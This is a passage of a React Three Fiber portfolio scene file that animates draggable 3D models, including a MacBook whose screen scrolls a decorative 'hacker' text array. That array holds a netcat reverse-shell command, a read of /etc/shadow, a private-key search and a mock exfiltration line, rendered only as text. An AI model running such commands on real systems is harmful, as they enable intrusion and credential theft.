"use client";

import { useMemo, useRef, useEffect } from "react";
import { useGLTF, Billboard, Sparkles } from "@react-three/drei";
import { useFrame, useThree, type ThreeEvent } from "@react-three/fiber";
import { RigidBody, CuboidCollider, RapierRigidBody, useRapier } from "@react-three/rapier";
import * as THREE from "three";
import { useNavigation } from "@/context/NavigationContext";
import { WEB_PROJECTS } from "@/lib/projects";
import { setObjectPosition, type ObjectKey } from "./sceneStore";
import { useDragThrow } from "./useDragThrow";

// ── Static table on the floor ─────────────────────────────────────────────
// Table raw bounds (after its 90° node rotation): X ±1.0, Y ±0.5, Z ±0.601
// At scale=3: height 3.0 → bottom at FLOOR_Y=-1.9, top (tabletop) at Y=1.1
// Center Y = -1.9 + 1.5 = -0.4
function TableModel() {
  const { scene } = useGLTF("/assets/table.glb");
  const cloned = useMemo(() => {
    const c = scene.clone();
    c.traverse((child) => {
      if (child instanceof THREE.Mesh) {
        child.material = (child.material as THREE.MeshStandardMaterial).clone();
        const mat = child.material as THREE.MeshStandardMaterial;
        mat.transparent = false;
        mat.opacity = 1;
        mat.depthWrite = true;
        mat.needsUpdate = true;
      }
    });
    return c;
  }, [scene]);
  return (
    <RigidBody type="fixed" position={[0, -0.4, 0]} colliders="cuboid">
      <primitive object={cloned} scale={3} />
    </RigidBody>
  );
}

const HEART_GLOW = new THREE.Color("#ff2a4a");

/** Lub-dub envelope over one beat, phase in [0,1) → [0,1]. */
function heartbeat(phase: number) {
  if (phase < 0.08) return Math.sin((phase / 0.08) * Math.PI);
  if (phase > 0.13 && phase < 0.25) return 0.6 * Math.sin(((phase - 0.13) / 0.12) * Math.PI);
  return 0;
}

// Imperative material updates live outside components (React Compiler immutability rule).
function setEmissiveIntensity(mats: THREE.MeshStandardMaterial[], v: number) {
  for (const m of mats) m.emissiveIntensity = v;
}

function HeartV2Model() {
  const { scene } = useGLTF("/assets/heart.glb");
  const { heartFocused, setHeartFocused, macbookFocused, iphoneFocused, mugFocused } = useNavigation();
  const { cloned, glowMats } = useMemo(() => {
    const c = scene.clone();
    const mats: THREE.MeshStandardMaterial[] = [];
    c.traverse((n) => {
      if (n instanceof THREE.Mesh && n.material instanceof THREE.MeshStandardMaterial) {
        const m = n.material.clone();
        m.emissive.set(HEART_GLOW);
        m.emissiveIntensity = 0;
        n.material = m;
        mats.push(m);
      }
    });
    return { cloned: c, glowMats: mats };
  }, [scene]);
  const groupRef = useRef<THREE.Group>(null);
  const rigidBodyRef = useRef<RapierRigidBody>(null);
  const worldPos = useRef<THREE.Vector3 | null>(null);
  const hoverRef = useRef(false);
  const beatT = useRef(0);
  const start = useRef({ x: 0, y: 0 });
  const anyOtherFocused = macbookFocused || iphoneFocused || mugFocused;
  const drag = useDragThrow(rigidBodyRef, { enabled: !heartFocused && !anyOtherFocused, spawn: [-2.3, 7, 0] });

  useFrame((_, delta) => {
    if (rigidBodyRef.current) {
      const t = rigidBodyRef.current.translation();
      if (!worldPos.current) worldPos.current = new THREE.Vector3();
      worldPos.current.set(t.x, t.y, t.z);
      setObjectPosition("heart" satisfies ObjectKey, t);
    }
    if (!groupRef.current) return;
    // Always beating: a slow, subtle idle pulse; faster and stronger on hover.
    const hovered = hoverRef.current;
    beatT.current += delta;
    const pulse = heartbeat(beatT.current % (hovered ? 1.5 : 1.9) / (hovered ? 1.5 : 1.9));
    const target = 1 + pulse * (hovered ? 0.12 : 0.035);
    const cur = groupRef.current.scale.x;
    groupRef.current.scale.setScalar(cur + (target - cur) * 0.5);
    setEmissiveIntensity(glowMats, (hovered ? 0.35 : 0.08) + pulse * (hovered ? 1.6 : 0.45));
  });

  useEffect(() => {
    const onKey = (e: KeyboardEvent) => {
      if (e.key === "Escape" && heartFocused) setHeartFocused(false);
    };
    window.addEventListener("keydown", onKey);
    return () => window.removeEventListener("keydown", onKey);
  }, [heartFocused, setHeartFocused]);

  return (
    <>
      <ObjectCameraRig
        targetPos={worldPos}
        focused={heartFocused}
        camOff={[0, 0.5, 0.7]}
        lookOff={[0, 0.2, 0]}
      />
      <RigidBody ref={rigidBodyRef} position={[-2.3, 7, 0]} rotation={[0, Math.PI / 12, 0]} restitution={0.2} friction={1.0} linearDamping={0.5} angularDamping={0.5} colliders="cuboid">
        <group ref={groupRef}>
          <primitive
            object={cloned}
            scale={1.5}
            onPointerEnter={() => { hoverRef.current = true; }}
            onPointerLeave={() => { hoverRef.current = false; }}
            onPointerDown={(e: ThreeEvent<PointerEvent>) => {
              start.current = { x: e.clientX, y: e.clientY };
              drag.onPointerDown(e);
            }}
            onPointerUp={(e: { clientX: number; clientY: number }) => {
              const d = Math.hypot(e.clientX - start.current.x, e.clientY - start.current.y);
              if (d < 5 && !heartFocused && !anyOtherFocused) setHeartFocused(true);
            }}
          />
        </group>
      </RigidBody>
    </>
  );
}

// ── MacBook hacker screen ────────────────────────────────────────────────
const MB_SCR = { x1: 15, y1: 15, x2: 350, y2: 222 };
const MB_PIX = 7;

const HACK_LINES = [
  "$ ssh root@192.168.1.1 -p 22",
  "root@target:~# ls -la /etc",
  "[*] Scanning 65535 ports...",
  "[+] Port 22/tcp   OPEN  ssh",
  "[+] Port 443/tcp  OPEN  https",
  "$ ./exploit.sh --silent",
  "[*] Enumerating SUID bins...",
  "[*] Presenting Website Projects...",
  "[+] Found: /usr/bin/python3",
  "$ python3 -c 'import pty; pty.spawn(\"/bin/bash\")'",
  "# whoami",
  "root",
  "# cat /etc/shadow | head -3",
  "root:$6$rT7sXz...:19200:0:99999:7:::",
  "# find / -name '*.pem' 2>/dev/null",
  "/etc/ssl/private/server.key",
  "# nc -e /bin/bash 10.0.0.1 4444",
  "[*] Reverse shell established",
  "$ exfil --target /home --host c2.local",
  "[+] Transfer complete: 4.2 GB",
  "$ _",
];

function drawHackerCanvas(ctx: CanvasRenderingContext2D, reveal: number, t: number) {
  // Screen UVs are V-flipped relative to the canvas: draw mirrored so text reads upright.
  ctx.save();
  ctx.translate(0, MB_SCR.y1 + MB_SCR.y2);
  ctx.scale(1, -1);
  drawHackerUnflipped(ctx, reveal, t);
  ctx.restore();
}

function drawHackerUnflipped(ctx: CanvasRenderingContext2D, reveal: number, t: number) {
  const { x1, y1, x2, y2 } = MB_SCR;
  const scrW = x2 - x1;
  const scrH = y2 - y1;
  const revealPx = Math.round(reveal * scrW);
  const frontierX = x1 + revealPx;

  if (revealPx > 0) {
    ctx.save();
    ctx.beginPath();
    ctx.rect(x1, y1, revealPx, scrH);
    ctx.clip();
    ctx.fillStyle = "#000";
    ctx.fillRect(x1, y1, revealPx, scrH);
    const fz = 8;
    const lh = fz + 3;
    ctx.font = `${fz}px monospace`;
    const numLines = Math.ceil(scrH / lh) + 1;
    const scroll = Math.floor(t * 2.5) % HACK_LINES.length;
    for (let i = 0; i < numLines; i++) {
      const line = HACK_LINES[(scroll + i) % HACK_LINES.length];
      const age = i / numLines;
      const g = Math.floor(60 + age * 195);
      ctx.fillStyle = `rgb(0,${g},${Math.floor(g * 0.25)})`;
      ctx.fillText(line, x1 + 3, y1 + i * lh + fz);
    }
    if (Math.floor(t * 2) % 2 === 0) {
      ctx.fillStyle = "#00ff41";
      ctx.fillRect(x1 + 3, y2 - lh - 2, 5, fz);
    }
    ctx.restore();
  }

  if (revealPx <= 0) return;
  const transW = MB_PIX * 5;
  for (let px = Math.max(x1, frontierX - transW); px < Math.min(x2, frontierX + MB_PIX); px += MB_PIX) {
    for (let py = y1; py < y2; py += MB_PIX) {
      const d = frontierX - (px + MB_PIX / 2);
      const blend = Math.max(0, Math.min(1, d / transW));
      const flicker = Math.abs(Math.sin(px * 13.7 + py * 7.3 + t * 8));
      const g = Math.floor(flicker * 255 * blend);
      ctx.fillStyle = `rgb(0,${g},${Math.floor(g * 0.16)})`;
      ctx.fillRect(px, py, MB_PIX, MB_PIX);
    }
  }
}

// Idle screen: crossfading slideshow of project screenshots.
const SLIDE_PERIOD = 3.5;
const SLIDE_FADE = 0.6;

function drawCover(ctx: CanvasRenderingContext2D, img: HTMLImageElement, alpha: number) {
  const { x1, y1, x2, y2 } = MB_SCR;
  const w = x2 - x1, h = y2 - y1;
  const s = Math.max(w / img.width, h / img.height);
  const sw = w / s, sh = h / s;
  ctx.save();
  ctx.globalAlpha = alpha;
  // Screen UVs are V-flipped relative to the canvas: mirror vertically within the screen rect.
  ctx.translate(0, y1 + y2);
  ctx.scale(1, -1);
  ctx.drawImage(img, 0, 0, sw, sh, x1, y1, w, h); // top-aligned crop: headers are the recognisable part
  ctx.restore();
}

function drawSlideshow(ctx: CanvasRenderingContext2D, imgs: HTMLImageElement[], t: number) {
  ctx.fillStyle = "#000";
  ctx.fillRect(0, 0, 512, 512);
  if (imgs.length === 0) return;
  const k = Math.floor(t / SLIDE_PERIOD);
  const local = t - k * SLIDE_PERIOD;
  drawCover(ctx, imgs[k % imgs.length], 0.8);
  const fade = Math.max(0, (local - (SLIDE_PERIOD - SLIDE_FADE)) / SLIDE_FADE);
  if (fade > 0) drawCover(ctx, imgs[(k + 1) % imgs.length], 0.8 * fade);
}

// Imperative three.js update, called every frame from useFrame. Kept outside the
// component so React's immutability rules don't apply to the material/texture.
function updateMacbookScreen(
  mat: THREE.MeshStandardMaterial,
  texture: THREE.CanvasTexture,
  ctx: CanvasRenderingContext2D,
  slides: HTMLImageElement[],
  state: { lastKey: string },
  reveal: number,
  hackT: number,
  t: number,
) {
  if (mat.emissiveMap !== texture) {
    mat.emissiveMap = texture;
    mat.needsUpdate = true;
  }
  mat.emissiveIntensity = 1 + reveal * 0.8; // hacker green blooms on hover
  const key = drawSlideshowKey(slides, t);
  if (reveal <= 0 && key === state.lastKey) return;
  drawSlideshow(ctx, slides, t);
  drawHackerCanvas(ctx, reveal, hackT);
  state.lastKey = reveal > 0 ? "hack" : key;
  texture.needsUpdate = true;
}

/** Identifies what drawSlideshow would draw, so unchanged frames skip the texture upload. */
function drawSlideshowKey(imgs: HTMLImageElement[], t: number) {
  if (imgs.length === 0) return "empty";
  const k = Math.floor(t / SLIDE_PERIOD);
  const fade = Math.max(0, (t - k * SLIDE_PERIOD - (SLIDE_PERIOD - SLIDE_FADE)) / SLIDE_FADE);
  return `${imgs.length}:${k}:${Math.round(fade * 20)}`;
}

/** Loads live-project screenshots in the background; resolves into the returned ref's array. */
function useProjectSlides() {
  const slides = useRef<HTMLImageElement[]>([]);
  useEffect(() => {
    let cancelled = false;
    for (const p of WEB_PROJECTS.filter((x) => x.status === "live")) {
      const img = new Image();
      img.onload = () => { if (!cancelled) slides.current.push(img); };
      img.src = `/screenshots/${p.id}.webp`;
    }
    return () => { cancelled = true; };
  }, []);
  return slides;
}

// ── Generic object camera rig ────────────────────────────────────────────
function ObjectCameraRig({
  targetPos,
  focused,
  camOff,
  lookOff,
}: {
  targetPos: { current: THREE.Vector3 | null };
  focused: boolean;
  camOff: [number, number, number];
  lookOff: [number, number, number];
}) {
  const { camera } = useThree();
  const camPos = useRef(new THREE.Vector3());
  const lookTarget = useRef(new THREE.Vector3());
  const wantCam = useRef(new THREE.Vector3());
  const wantLook = useRef(new THREE.Vector3());
  const init = useRef(false);

  useFrame(() => {
    if (!focused || !targetPos.current) return;
    const p = targetPos.current;
    wantCam.current.set(p.x + camOff[0], p.y + camOff[1], p.z + camOff[2]);
    wantLook.current.set(p.x + lookOff[0], p.y + lookOff[1], p.z + lookOff[2]);
    if (!init.current) {
      camPos.current.copy(camera.position);
      lookTarget.current.copy(wantLook.current);
      init.current = true;
    }
    camPos.current.lerp(wantCam.current, 0.06);
    lookTarget.current.lerp(wantLook.current, 0.06);
    camera.position.copy(camPos.current);
    camera.lookAt(lookTarget.current);
  });

  useEffect(() => {
    if (!focused) init.current = false;
  }, [focused]);

  return null;
}

// ── Dim overlay plane ────────────────────────────────────────────────────
function DimPlane() {
  const { macbookFocused, heartFocused, iphoneFocused, mugFocused } = useNavigation();
  const matRef = useRef<THREE.MeshBasicMaterial>(null);

  useFrame(() => {
    if (!matRef.current) return;
    const anyFocused = macbookFocused || heartFocused || iphoneFocused || mugFocused;
    const target = anyFocused ? 0.88 : 0;
    matRef.current.opacity += (target - matRef.current.opacity) * 0.06;
    matRef.current.visible = matRef.current.opacity > 0.01;
  });

  return (
    <mesh renderOrder={9} position={[0, 0, -0.5]}>
      <planeGeometry args={[200, 200]} />
      <meshBasicMaterial
        ref={matRef}
        color="#000000"
        transparent
        opacity={0}
        depthTest={false}
        depthWrite={false}
      />
    </mesh>
  );
}

function MacBookModel() {
  const { scene } = useGLTF("/assets/macbook.glb");
  const { macbookFocused, setMacbookFocused, heartFocused, iphoneFocused, mugFocused } = useNavigation();
  const rigidBodyRef = useRef<RapierRigidBody>(null);
  const drag = useDragThrow(rigidBodyRef, {
    enabled: !macbookFocused && !heartFocused && !iphoneFocused && !mugFocused,
    spawn: [-0.2, 9, 0],
  });
  const worldPos = useRef<THREE.Vector3 | null>(null);
  const hoverRef = useRef(false);
  const revealRef = useRef(0);
  const hackTimeRef = useRef(0);
  const start = useRef({ x: 0, y: 0 });

  const slides = useProjectSlides();
  const screenState = useRef({ lastKey: "" });
  const { cloned, hackCtx, hackTexture, clonedMat } = useMemo((): {
    cloned: THREE.Object3D;
    hackCtx: CanvasRenderingContext2D | null;
    hackTexture: THREE.CanvasTexture | null;
    clonedMat: THREE.MeshStandardMaterial | null;
  } => {
    const c = scene.clone();
    let mat: THREE.MeshStandardMaterial | null = null;
    c.traverse((n) => {
      if (n instanceof THREE.Mesh && !mat) {
        mat = (n.material as THREE.MeshStandardMaterial).clone();
        (n as THREE.Mesh).material = mat;
      }
    });
    if (!mat) return { cloned: c, hackCtx: null, hackTexture: null, clonedMat: null };
    const canvas = document.createElement("canvas");
    canvas.width = 512;
    canvas.height = 512;
    const ctx = canvas.getContext("2d")!;
    const texture = new THREE.CanvasTexture(canvas);
    texture.flipY = false;
    texture.colorSpace = THREE.SRGBColorSpace;
    return { cloned: c, hackCtx: ctx, hackTexture: texture, clonedMat: mat };
  }, [scene]);

  useFrame(({ clock }, delta) => {
    // Track world position for camera rig and overlay anchor
    if (rigidBodyRef.current) {
      const t = rigidBodyRef.current.translation();
      if (!worldPos.current) worldPos.current = new THREE.Vector3();
      worldPos.current.set(t.x, t.y, t.z);
      setObjectPosition("macbook" satisfies ObjectKey, t);
    }

    // Hacker screen animation
    if (!clonedMat || !hackCtx || !hackTexture) return;
    if (hoverRef.current || macbookFocused) {
      revealRef.current = Math.min(1, revealRef.current + delta * 1.0);
      hackTimeRef.current += delta;
    } else {
      revealRef.current = Math.max(0, revealRef.current - delta * 1.5);
    }
    updateMacbookScreen(
      clonedMat, hackTexture, hackCtx, slides.current, screenState.current,
      revealRef.current, hackTimeRef.current, clock.getElapsedTime(),
    );
  });

  useEffect(() => {
    const onKey = (e: KeyboardEvent) => {
      if (e.key === "Escape" && macbookFocused) setMacbookFocused(false);
    };
    window.addEventListener("keydown", onKey);
    return () => window.removeEventListener("keydown", onKey);
  }, [macbookFocused, setMacbookFocused]);

  return (
    <>
      <ObjectCameraRig
        targetPos={worldPos}
        focused={macbookFocused}
        camOff={[0, 0.38, 0.55]}
        lookOff={[0, 0.28, 0]}
      />
      <RigidBody ref={rigidBodyRef} position={[-0.2, 9, 0]} restitution={0.2} friction={1.0} linearDamping={0.5} angularDamping={0.5} colliders="cuboid">
        <primitive
          object={cloned}
          scale={7}
          onPointerEnter={() => { hoverRef.current = true; }}
          onPointerLeave={() => { hoverRef.current = false; }}
          onPointerDown={(e: ThreeEvent<PointerEvent>) => {
            start.current = { x: e.clientX, y: e.clientY };
            drag.onPointerDown(e);
          }}
          onPointerUp={(e: { clientX: number; clientY: number }) => {
            const d = Math.hypot(e.clientX - start.current.x, e.clientY - start.current.y);
            if (d < 5 && !macbookFocused) setMacbookFocused(true);
          }}
        />
      </RigidBody>
    </>
  );
}

// Floor surface Y — matches CuboidCollider at position [0,-2,0] with half-height 0.1
const FLOOR_Y = -1.9;
// Half the phone's model-space height (7.369) at scale=0.12
const PHONE_HALF_H = 7.369 * 0.12;
// Reusable identity quaternion — never mutated
const IDENTITY_Q = new THREE.Quaternion();

type PhoneScreen = { ctx: CanvasRenderingContext2D; texture: THREE.CanvasTexture; minute: number };

// Lock screen: clock + monogram. Text is centred at x=65, the visible part of the screen UVs.
function drawPhoneScreen(ctx: CanvasRenderingContext2D, now: Date) {
  ctx.fillStyle = "#050810";
  ctx.fillRect(0, 0, 256, 256);

  const glow = ctx.createRadialGradient(128, 128, 20, 128, 128, 100);
  glow.addColorStop(0, "rgba(100,200,140,0.25)");
  glow.addColorStop(1, "rgba(0,0,0,0)");
  ctx.fillStyle = glow;
  ctx.fillRect(0, 0, 256, 256);

  ctx.textAlign = "center";
  ctx.textBaseline = "middle";

  // Clock
  const hh = String(now.getHours()).padStart(2, "0");
  const mm = String(now.getMinutes()).padStart(2, "0");
  ctx.font = "600 30px sans-serif";
  ctx.fillStyle = "#e8eaf2";
  ctx.fillText(`${hh}:${mm}`, 65, 62);
  ctx.font = "10px sans-serif";
  ctx.fillStyle = "rgba(232,234,242,0.6)";
  ctx.fillText(now.toLocaleDateString("en-GB", { weekday: "long", day: "numeric", month: "short" }), 65, 84);

  // Monogram
  ctx.font = "bold 40px sans-serif";
  ctx.fillStyle = "#6adc9e";
  ctx.fillText(":^)", 65, 124);

  // Role tag
  ctx.font = "14px monospace";
  ctx.fillStyle = "#c8aaff";
  ctx.fillText("<ContactMe/>", 65, 160);
}

function tickPhoneClock(screen: PhoneScreen) {
  const now = new Date();
  if (now.getMinutes() === screen.minute) return;
  screen.minute = now.getMinutes();
  drawPhoneScreen(screen.ctx, now);
  screen.texture.needsUpdate = true;
}

function IPhoneModel() {
  const { scene } = useGLTF("/assets/iphone.glb");
  const rigidBodyRef = useRef<RapierRigidBody>(null);
  const hoverRef = useRef(false);
  const settledRef = useRef(false);
  const hasMovedRef = useRef(false);
  const pivotPt = useRef(new THREE.Vector3());
  const settledRot = useRef(new THREE.Quaternion());
  const hoverT = useRef(0);
  // Scratch objects reused each frame — avoids per-frame allocations
  const scratchQ = useRef(new THREE.Quaternion());
  const scratchV = useRef(new THREE.Vector3());
  const { rapier } = useRapier();
  const { iphoneFocused, setIphoneFocused, macbookFocused, heartFocused, mugFocused } = useNavigation();
  const worldPos = useRef<THREE.Vector3 | null>(null);
  const startClick = useRef({ x: 0, y: 0 });
  const anyOtherFocused = macbookFocused || heartFocused || mugFocused;
  const drag = useDragThrow(rigidBodyRef, {
    enabled: !iphoneFocused && !anyOtherFocused,
    spawn: [1.5, 6.5, 0.7],
    // Settled phone is kinematic (for the stand-up hover); make it dynamic again to throw it.
    onGrab: () => {
      const rb = rigidBodyRef.current;
      if (rb && settledRef.current) rb.setBodyType(rapier.RigidBodyType.Dynamic, true);
      settledRef.current = false;
      hasMovedRef.current = true;
      hoverT.current = 0;
    },
  });

  useFrame(() => {
    const rb = rigidBodyRef.current;
    if (!rb) return;

    if (rb) {
      const t = rb.translation();
      if (!worldPos.current) worldPos.current = new THREE.Vector3();
      worldPos.current.set(t.x, t.y, t.z);
      setObjectPosition("iphone" satisfies ObjectKey, t);
    }

    if (!settledRef.current) {
      if (drag.isDragging()) return;
      const linVel = rb.linvel();
      const angVel = rb.angvel();
      const speed = Math.hypot(linVel.x, linVel.y, linVel.z);
      const angSpeed = Math.hypot(angVel.x, angVel.y, angVel.z);
      const pos = rb.translation();

      // Wait until phone has actually moved fast before checking for settle
      if (speed > 1.5) hasMovedRef.current = true;

      if (hasMovedRef.current && speed < 0.08 && angSpeed < 0.08 && pos.y < 3.5) {
        // Phone has settled on the floor — lock it
        settledRef.current = true;
        const rot = rb.rotation();
        settledRot.current.set(rot.x, rot.y, rot.z, rot.w);

        // Compute pivot: the bottom of the phone in world space, clamped to floor
        scratchV.current
          .set(0, -PHONE_HALF_H, 0)
          .applyQuaternion(settledRot.current);
        pivotPt.current.set(
          pos.x + scratchV.current.x,
          Math.max(pos.y + scratchV.current.y, FLOOR_Y),
          pos.z + scratchV.current.z,
        );

        rb.setBodyType(rapier.RigidBodyType.KinematicPositionBased, true);
      }
      return;
    }

    // Smoothly animate hoverT: 0 = lying flat (settled), 1 = standing upright
    const target = hoverRef.current ? 1 : 0;
    hoverT.current += (target - hoverT.current) * 0.07;

    // Rotation: slerp from settled orientation to identity (Y-up upright)
    scratchQ.current.slerpQuaternions(settledRot.current, IDENTITY_Q, hoverT.current);

    // Position: keep the phone's bottom pinned to pivotPt while it rotates
    //   center = pivot + rotate(upVector * PHONE_HALF_H, currentRot)
    scratchV.current.set(0, PHONE_HALF_H, 0).applyQuaternion(scratchQ.current);
    rb.setNextKinematicTranslation({
      x: pivotPt.current.x + scratchV.current.x,
      y: pivotPt.current.y + scratchV.current.y,
      z: pivotPt.current.z + scratchV.current.z,
    });
    rb.setNextKinematicRotation(scratchQ.current);
  });

  const { cloned, phoneScreen } = useMemo(() => {
    const c = scene.clone();

    // Build a canvas texture for the screen (Object_12 has emissive [1,1,1])
    // Screen UV range is [0.1, 0.9] in both axes on a square canvas.
    // flipY must be false — GLTF V=0 is at top, so default flipY=true causes upside-down rendering.
    const canvas = document.createElement("canvas");
    canvas.width = 256;
    canvas.height = 256;
    const ctx = canvas.getContext("2d")!;
    drawPhoneScreen(ctx, new Date());

    const texture = new THREE.CanvasTexture(canvas);
    texture.flipY = false;

    const screen: PhoneScreen = { ctx, texture, minute: new Date().getMinutes() };

    c.traverse((child) => {
      if (child instanceof THREE.Mesh) {
        const mat = child.material as THREE.MeshStandardMaterial;
        // Target the screen: full-white emissive, no base color texture
        if (mat && mat.emissive && mat.emissive.r > 0.8 && mat.emissive.g > 0.8 && mat.emissive.b > 0.8) {
          child.material = new THREE.MeshStandardMaterial({
            map: texture,
            emissiveMap: texture,
            emissive: new THREE.Color(0.08, 0.12, 0.1),
            roughness: 0.05,
            metalness: 0.0,
          });
        }
      }
    });

    return { cloned: c, phoneScreen: screen };
  }, [scene]);

  useFrame(() => tickPhoneClock(phoneScreen));

  useEffect(() => {
    const onKey = (e: KeyboardEvent) => {
      if (e.key === "Escape" && iphoneFocused) setIphoneFocused(false);
    };
    window.addEventListener("keydown", onKey);
    return () => window.removeEventListener("keydown", onKey);
  }, [iphoneFocused, setIphoneFocused]);

  return (
    <>
      <ObjectCameraRig
        targetPos={worldPos}
        focused={iphoneFocused}
        camOff={[0, 0.6, 0.5]}
        lookOff={[0, 0.4, 0]}
      />
      <RigidBody ref={rigidBodyRef} rotation={[0, -Math.PI / 16, 0]} position={[1.5, 6.5, 0.7]} restitution={0.3} friction={0.9} linearDamping={0.5} angularDamping={0.5} colliders="cuboid">
        <primitive
          object={cloned}
          scale={0.08}
          onPointerEnter={() => { hoverRef.current = true; }}
          onPointerLeave={() => { hoverRef.current = false; }}
          onPointerDown={(e: ThreeEvent<PointerEvent>) => {
            startClick.current = { x: e.clientX, y: e.clientY };
            drag.onPointerDown(e);
          }}
          onPointerUp={(e: { clientX: number; clientY: number }) => {
            const d = Math.hypot(e.clientX - startClick.current.x, e.clientY - startClick.current.y);
            if (d < 5 && !iphoneFocused && !anyOtherFocused) setIphoneFocused(true);
          }}
        />
      </RigidBody>
    </>
  );
}

const MUG_INTERIOR_COLOR = new THREE.Color("#e6ab1d");
const MUG_SCALE = 3.5;

// Build a 512×256 canvas texture: gold background + "Kjeldsberg" in espresso brown.
// Applied directly to the exterior (Glossy_Orange) mesh after remapping its UVs to [0,1].
function buildMugLabelTexture(): THREE.CanvasTexture {
  const canvas = document.createElement('canvas');
  canvas.width = 512;
  canvas.height = 256;
  const ctx = canvas.getContext('2d')!;
  ctx.fillStyle = '#e6ab1d';
  ctx.fillRect(0, 0, 512, 256);
  ctx.textAlign = 'center';
  ctx.textBaseline = 'middle';
  ctx.fillStyle = '#e6ab1d';
  return new THREE.CanvasTexture(canvas);
}

// ── Mug steam ────────────────────────────────────────────────────────────
const steamVertex = `
  varying vec2 vUv;
  void main() {
    vUv = uv;
    gl_Position = projectionMatrix * modelViewMatrix * vec4(position, 1.0);
  }
`;

const steamFragment = `
  uniform float uTime;
  uniform float uOpacity;
  varying vec2 vUv;

  float hash(vec2 p) { return fract(sin(dot(p, vec2(127.1, 311.7))) * 43758.5453); }
  float noise(vec2 p) {
    vec2 i = floor(p), f = fract(p);
    f = f * f * (3.0 - 2.0 * f);
    return mix(mix(hash(i), hash(i + vec2(1.0, 0.0)), f.x),
               mix(hash(i + vec2(0.0, 1.0)), hash(i + vec2(1.0, 1.0)), f.x), f.y);
  }

  void main() {
    vec2 uv = vUv;
    float t = uTime * 0.35;
    // Sway grows with height, like rising steam
    uv.x += (noise(vec2(uv.y * 2.0 - t, 3.1)) - 0.5) * 0.55 * uv.y;
    float n = noise(vec2(uv.x * 4.0, uv.y * 3.0 - t * 2.0)) * 0.6
            + noise(vec2(uv.x * 9.0, uv.y * 6.0 - t * 3.2)) * 0.4;
    float column = smoothstep(0.5, 0.12, abs(uv.x - 0.5));
    float fade = smoothstep(0.0, 0.18, uv.y) * smoothstep(1.0, 0.4, uv.y);
    float a = smoothstep(0.42, 0.85, n) * column * fade * uOpacity;
    gl_FragColor = vec4(vec3(1.0), a * 0.28);
  }
`;

const STEAM_UP = new THREE.Vector3(0, 1, 0);

function updateSteam(
  group: THREE.Group,
  mat: THREE.ShaderMaterial,
  body: RapierRigidBody,
  rimY: number,
  height: number,
  t: number,
  scratch: { q: THREE.Quaternion; up: THREE.Vector3 },
) {
  const p = body.translation();
  const r = body.rotation();
  const v = body.linvel();
  scratch.q.set(r.x, r.y, r.z, r.w);
  scratch.up.copy(STEAM_UP).applyQuaternion(scratch.q);
  group.position.set(
    p.x + scratch.up.x * rimY,
    p.y + scratch.up.y * rimY + height / 2,
    p.z + scratch.up.z * rimY,
  );
  // Only steam when upright and at rest
  const upright = THREE.MathUtils.smoothstep(scratch.up.y, 0.9, 0.98);
  const still = Math.hypot(v.x, v.y, v.z) < 0.3 ? 1 : 0;
  const u = mat.uniforms;
  u.uTime.value = t;
  u.uOpacity.value += (upright * still - u.uOpacity.value) * 0.03;
  group.visible = u.uOpacity.value > 0.01;
}

function MugSteam({ body, rimY, width }: { body: React.RefObject<RapierRigidBody | null>; rimY: number; width: number }) {
  const groupRef = useRef<THREE.Group>(null);
  const matRef = useRef<THREE.ShaderMaterial>(null);
  const scratch = useRef({ q: new THREE.Quaternion(), up: new THREE.Vector3() });
  const height = width * 2.2;

  useFrame(({ clock }) => {
    if (!groupRef.current || !matRef.current || !body.current) return;
    updateSteam(groupRef.current, matRef.current, body.current, rimY, height, clock.getElapsedTime(), scratch.current);
  });

  return (
    <group ref={groupRef} visible={false}>
      <Billboard lockX lockZ>
        <mesh>
          <planeGeometry args={[width * 0.9, height]} />
          <shaderMaterial
            ref={matRef}
            vertexShader={steamVertex}
            fragmentShader={steamFragment}
            uniforms={{ uTime: { value: 0 }, uOpacity: { value: 0 } }}
            transparent
            depthWrite={false}
          />
        </mesh>
      </Billboard>
    </group>
  );
}

function MugModel() {
  const { scene } = useGLTF('/assets/mug.glb');
  const { mugFocused, setMugFocused, macbookFocused, heartFocused, iphoneFocused } = useNavigation();
  const rigidBodyRef = useRef<RapierRigidBody>(null);
  const groupRef = useRef<THREE.Group>(null);
  const worldPos = useRef<THREE.Vector3 | null>(null);
  const hoverRef = useRef(false);
  const start = useRef({ x: 0, y: 0 });
  const anyOtherFocused = macbookFocused || heartFocused || iphoneFocused;
  const drag = useDragThrow(rigidBodyRef, { enabled: !mugFocused && !anyOtherFocused, spawn: [2.5, 4.0, 0.7] });

  const { cloned, rimY, mugWidth } = useMemo(() => {
    const labelTex = buildMugLabelTexture();
    const c = scene.clone();
    c.traverse((child) => {
      if (!(child instanceof THREE.Mesh)) return;
      const mat = child.material as THREE.MeshStandardMaterial;
      if (!mat) return;
      child.material = mat.clone();
      const m = child.material as THREE.MeshStandardMaterial;
      if (m.name === 'Matt_Whit' || m.name === 'Material.005') {
        m.color.set(MUG_INTERIOR_COLOR);
        m.transparent = true;
        m.opacity = 0;
        m.needsUpdate = true;
      } else if (m.name === 'Glossy_Orange') {
        child.geometry = child.geometry.clone();
        const uv = child.geometry.getAttribute('uv') as THREE.BufferAttribute;
        if (uv) {
          let minU = Infinity, maxU = -Infinity, minV = Infinity, maxV = -Infinity;
          for (let i = 0; i < uv.count; i++) {
            const u = uv.getX(i), v = uv.getY(i);
            if (u < minU) minU = u; if (u > maxU) maxU = u;
            if (v < minV) minV = v; if (v > maxV) maxV = v;
          }
          const dU = maxU - minU || 1;
          const dV = maxV - minV || 1;
          for (let i = 0; i < uv.count; i++) {
            uv.setXY(i, (uv.getX(i) - minU) / dU, (uv.getY(i) - minV) / dV);
          }
          uv.needsUpdate = true;
        }
        m.map = labelTex;
        m.color.set('#ffffff');
        m.needsUpdate = true;
      }
    });
    const box = new THREE.Box3().setFromObject(c);
    return {
      cloned: c,
      rimY: box.max.y * MUG_SCALE,
      mugWidth: (box.max.x - box.min.x) * MUG_SCALE,
    };
  }, [scene]);

  useFrame((_, delta) => {
    if (rigidBodyRef.current) {
      const t = rigidBodyRef.current.translation();
      if (!worldPos.current) worldPos.current = new THREE.Vector3();
      worldPos.current.set(t.x, t.y, t.z);
      setObjectPosition("mug" satisfies ObjectKey, t);
    }
    if (groupRef.current && hoverRef.current) {
      groupRef.current.rotation.y -= delta * 1.6;
    }
  });

  useEffect(() => {
    const onKey = (e: KeyboardEvent) => {
      if (e.key === "Escape" && mugFocused) setMugFocused(false);
    };
    window.addEventListener("keydown", onKey);
    return () => window.removeEventListener("keydown", onKey);
  }, [mugFocused, setMugFocused]);

  return (
    <>
      <ObjectCameraRig
        targetPos={worldPos}
        focused={mugFocused}
        camOff={[0, 0.5, 0.6]}
